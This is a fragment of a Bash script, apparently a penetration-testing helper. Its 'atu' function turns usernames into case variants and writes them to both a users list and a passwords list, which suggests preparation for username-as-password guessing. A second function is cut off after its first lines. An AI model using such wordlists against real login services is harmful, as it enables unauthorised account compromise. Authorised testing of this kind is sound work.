atu() {
    if [ "$#" -eq 0 ]; then
        echo "Please provide at least one username."
        return 1
    fi

    usersfile="${PWD}/users.txt"
    passfile="${PWD}/passwords.txt"

    # Ensure files exist but do NOT truncate them
    touch "$usersfile" "$passfile"

    for user in "$@"; do
        lc="$(printf '%s' "$user" | tr '[:upper:]' '[:lower:]')"
        uc="$(printf '%s' "$user" | tr '[:lower:]' '[:upper:]')"

        for v in "$user" "$lc" "$uc"; do
            # Append to users file if not already present
            if ! grep -Fxq -- "$v" "$usersfile"; then
                printf '%s\n' "$v" >> "$usersfile"
            fi
            # Append to passwords file if not already present
            if ! grep -Fxq -- "$v" "$passfile"; then
                printf '%s\n' "$v" >> "$passfile"
            fi
        done
    done
}




atc() {
    # Check if any arguments are provided
    if [ "$#" -eq 0 ]; then
        echo "Please provide at least one context word."
        return 1
